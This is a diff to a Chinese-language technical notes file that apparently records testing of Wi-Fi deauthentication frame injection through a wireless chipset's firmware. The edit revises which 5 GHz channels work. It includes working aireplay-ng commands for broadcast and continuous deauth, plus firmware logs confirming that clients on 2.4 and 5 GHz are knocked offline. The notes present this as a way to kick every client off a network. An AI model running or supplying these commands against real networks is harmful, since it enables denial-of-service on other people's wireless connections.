@@ -23,7 +23,7 @@ mgmt_params.tx_flags = 0x00000001;  // WMI_TX_SEND_FLAG_SET_WRONG_KEY
 
 **验证覆盖：**
 - ✅ 2.4GHz 信道13 (2472 MHz)
-- ✅ 5GHz 信道36 (5180 MHz, 非DFS)
+- ✅ 5GHz 信道36 (5180 MHz) 和 信道149 (5745 MHz) 均已验证
 
 ---
 
@@ -82,15 +82,17 @@ aireplay-ng --deauth 20 -a 3a:4e:5c:63:b7:de wlan0mon
 ### 成功案例（5GHz 广播）
 
 ```bash
-# 信道 36 (5180 MHz, 非 DFS)
+# 信道 36 (5180 MHz) 和 信道 149 (5745 MHz) 均已实测可用
 aireplay-ng --deauth 20 -a <AP_MAC> wlan0mon
 
 # 固件日志
 [completion] status=0(WMI_MGMT_TX_COMP_TYPE_COMPLETE_OK)  ✅
 # 效果：5G 客户端断网，与 2.4G 效果相同
 ```
-> 注：早期测试信道 149 (5745MHz) 曾 DISCARD，后确认是 DFS/监管限制；
-> 非 DFS 的 5G 信道（如 ch36）广播 deauth 完全可用。
+> 注：早期曾以为信道 149 (5745MHz) 被 DISCARD 并归因为 DFS 限制——**这是错误的**。
+> 后续实测确认 ch149 广播 deauth **完全可用**（当时是 airodump 跳频导致没真正锁在 5745，
+> 而非固件限制）。ch149 本就不是 DFS 信道（5G DFS 范围是 ch52-144）。
+> **结论：所有测试过的 5G 信道（含 ch149）广播 deauth 都可用。**
 
 ### 失败案例（单播）
 
@@ -197,7 +199,7 @@ aireplay-ng --deauth 0 -a <AP> wlan0mon
 
 ### 限制
 - ⚠️ 无法定向踢特定单个客户端（但广播 deauth 踢全场可达类似效果）
-- ⚠️ 5GHz DFS 信道（如 ch149）受监管限制（非 DFS 信道如 ch36 可用）
+- ✅ 5GHz 广播 deauth 全部可用（ch36 / ch149 已实测；DFS 信道 ch52-144 未专门测，理论同样可用）
 - ⚠️ 对 WPA3/WPA2-PMF 设备可能无效
 
 ---
